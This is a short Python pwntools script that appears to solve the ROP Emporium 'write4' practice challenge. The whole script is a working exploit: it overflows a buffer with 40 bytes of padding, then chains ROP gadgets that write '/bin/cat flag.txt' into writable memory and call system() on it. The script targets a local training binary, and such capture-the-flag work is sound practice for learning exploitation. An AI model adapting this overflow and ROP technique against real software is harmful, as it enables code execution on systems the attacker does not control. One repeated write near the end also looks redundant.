#!/usr/bin/python

from pwn import *

movr14r15 = 0x00400820
popr14r15 = 0x00400890
poprdi    = 0x00400893

#address   = 0x00601050
address   = 0x00601060

p = process('./write4')
elf = ELF('./write4')

system = elf.symbols.system
#system = 0x00400810

info("%#x system", system)

def write(address, text):
	payload = ""
	payload += p64(popr14r15)
	payload += p64(address)
	payload += text
	payload += p64(movr14r15)
	return payload

payload = "A"* 40
payload += write(address,'/bin/cat')
payload += write(address+8,' flag.tx')
payload += write(address+16,'t\00\00\00\00\00\00\00')
payload += write(address+24,'t\00\00\00\00\00\00\00')

payload += p64(poprdi)
payload += p64(address)
payload += p64(system)

# Wait for debugger
#pid = util.proc.pidof(p)[0]
#print "The pid is: "+str(pid)
#util.proc.wait_for_debugger(pid)

p.sendline(payload)

p.interactive()
